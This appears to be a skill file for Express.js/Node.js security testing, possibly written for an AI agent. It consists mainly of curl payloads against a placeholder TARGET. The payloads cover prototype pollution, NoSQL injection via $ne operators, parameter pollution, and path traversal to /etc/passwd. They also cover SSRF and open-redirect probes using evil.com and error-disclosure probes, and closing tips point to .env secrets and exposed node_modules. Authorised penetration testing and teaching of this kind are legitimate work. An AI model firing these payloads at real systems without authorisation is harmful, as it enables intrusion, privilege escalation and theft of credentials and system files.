---
name: express
description: Express.js/Node.js security testing covering prototype pollution, middleware bypass, body-parser quirks, and path traversal
---

# Express.js Security Testing

## Key Vulnerabilities

### Prototype Pollution via qs Parser

```bash
# Express qs module auto-converts bracketed params to nested objects
curl -sk "https://TARGET/api/search?__proto__[isAdmin]=true"
curl -sk "https://TARGET/api/search?constructor[prototype][isAdmin]=true"

# Deep merge endpoints
curl -sk "https://TARGET/api/settings" -X PUT -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
```

### Body Parser Quirks

```bash
# Test JSON parsing with unexpected types
curl -sk "https://TARGET/api/login" -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' # NoSQL injection

# Express accepts arrays where objects expected
curl -sk "https://TARGET/api/register" -X POST -H "Content-Type: application/json" \
  -d '["admin","password"]'

# HPP (HTTP Parameter Pollution)
curl -sk "https://TARGET/api/transfer?amount=100&amount=-100"
```

### Path Traversal

```bash
# Express static middleware path traversal
curl -sk "https://TARGET/static/../../../etc/passwd"
curl -sk "https://TARGET/static/..%2f..%2f..%2fetc%2fpasswd"
curl -sk "https://TARGET/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# URL-encoded path separators that Express normalizes differently
curl -sk "https://TARGET/api/files/%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

### SSRF via URL Parsing

```bash
# Node.js URL parsing differences
curl -sk "https://TARGET/proxy?url=http://evil.com%40TARGET" # URL auth confusion
curl -sk "https://TARGET/proxy?url=http://TARGET@evil.com"   # Parsed differently by node vs browser
curl -sk "https://TARGET/redirect?to=//evil.com"             # Protocol-relative URL
```

### Debug/Error Information Disclosure

```bash
# Express error handler often reveals stack traces
curl -sk "https://TARGET/api/users/undefined" | grep -i "error\|stack\|trace"
curl -sk "https://TARGET/api/undefined" -H "Content-Type: application/json" -X POST -d "invalid"
# Check for express-debug, morgan, or debug module output
```

## Pro Tips

1. Express `qs` parser converts `param[$ne]=` to NoSQL operators — always test
2. `__proto__` pollution via query strings is Express-specific and very common
3. Node.js HTTP parser is more permissive than most — test CRLF, Unicode, and encoding tricks
4. `express-session` with MemoryStore leaks memory — check for DoS
5. Look for `node_modules` directory exposure and `package.json` for dependency enumeration
6. Test `.env` file access — Express apps commonly store secrets in dotenv files
